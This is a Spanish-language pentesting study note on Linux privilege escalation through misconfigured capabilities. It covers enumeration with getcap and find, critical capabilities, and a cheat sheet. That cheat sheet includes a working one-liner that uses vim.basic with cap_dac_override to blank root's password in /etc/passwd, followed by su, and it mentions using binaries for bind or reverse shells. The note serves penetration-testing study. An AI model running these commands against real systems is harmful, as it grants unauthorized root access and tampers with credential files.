---
tags:
  - linux
  - capabilities
  - privex
---
## Conceptos Clave (TL;DR)

* Las capabilities de Linux son una característica de seguridad que permite otorgar privilegios específicos a procesos sin necesidad de conceder acceso root completo.
* Una mala configuración ocurre al asignar estas capabilities a procesos que no están aislados (sandboxed), permitiendo la escalada de privilegios.
* El abuso o exceso de capabilities crea riesgos de seguridad innecesarios que pueden ser explotados para acceder a información sensible.
* Capabilities altamente críticas para la escalada a root incluyen: `cap_setuid`, `cap_setgid`, `cap_sys_admin` y `cap_dac_override`.

## Herramientas Clave

* **getcap**: Comando utilizado para visualizar las capabilities que han sido asignadas a los binarios ejecutables en el sistema.
* **find**: Utilizado en conjunto con `getcap` para buscar binarios recursivamente en directorios específicos del sistema operativo.
* **setcap**: Herramienta utilizada por administradores para asignar, modificar o eliminar capabilities específicas en binarios ejecutables.

## Metodología Paso a Paso
### Fase 1: Enumeración
El objetivo principal es auditar el sistema en busca de ejecutables que posean capabilities asignadas. Se escanean los directorios comunes del sistema para listar todas las capabilities existentes.

### Fase 2: Identificación de Vectores
Se debe revisar la salida del comando de enumeración buscando capabilities que otorguen permisos críticos. Un ejemplo de interés es `cap_dac_override`, la cual ignora las verificaciones de permisos de lectura, escritura y ejecución de archivos. Otras capabilities de alto valor incluyen `cap_sys_admin` para acciones administrativas y `cap_setuid` para suplantar usuarios.

### Fase 3: Explotación
Una vez identificado un binario vulnerable con una capability útil (ej. un editor de texto con `cap_dac_override`), se ejecuta para realizar acciones restringidas. Utilizando el binario, se puede modificar directamente un archivo crítico del sistema, como `/etc/passwd`, para eliminar la contraseña del usuario root. Finalmente, se escala privilegios iniciando sesión como root sin que el sistema solicite autenticación.

## Cheat Sheet de Comandos

```bash
# Busca en directorios comunes y ejecuta getcap para mostrar las capabilities de todos los binarios encontrados
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

# busca capacidades de ejecución desde la raíz
getcap -r / 2>/dev/null

# Muestra las capabilities específicas de un binario individual
getcap <PATH_TO_BINARY>

# (OPCIONAL/ADMINISTRACIÓN) Asigna una capability a un binario con permisos efectivos y permitidos (+ep)
sudo setcap <CAPABILITY>=+ep <PATH_TO_BINARY>

# Explota un editor de texto con cap_dac_override para abrir un archivo crítico del sistema (Modo Interactivo)
<PATH_TO_TEXT_EDITOR> /etc/passwd

# Explota vim.basic con cap_dac_override modificando /etc/passwd para eliminar la "x" de root (Modo No Interactivo)
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

# Inicia sesión como root tras eliminar el requerimiento de contraseña en /etc/passwd
su
```

## "Gotchas" y Troubleshooting

* **Limitación de Alcance:** Un binario con capabilities solo puede ejecutar las acciones exactas que la capability permite; no tiene acceso irrestricto por defecto.
* **Valores de Asignación (setcap):** * `=` asigna la capability pero no otorga los privilegios, útil para limpiar capabilities previas.
  * `+ep` otorga privilegios efectivos y permitidos.
  * `+ei` otorga privilegios suficientes y heredables, permitiendo que los procesos hijos mantengan los permisos.
  * `+p` otorga solo privilegios permitidos, evitando que el proceso o sus hijos los hereden.
* **Persistencia o Bind Shells:** Si encuentras un binario con `cap_net_bind_service`, este puede abrir puertos de red restringidos (por debajo del 1024), lo cual es útil para establecer servicios o reverse/bind shells.
* **Precaución con la manipulación del sistema:** Binarios con `cap_sys_module` o `cap_sys_time` pueden alterar el kernel o los relojes del sistema, lo cual puede causar comportamientos inesperados o inestabilidad si no se manejan con cuidado.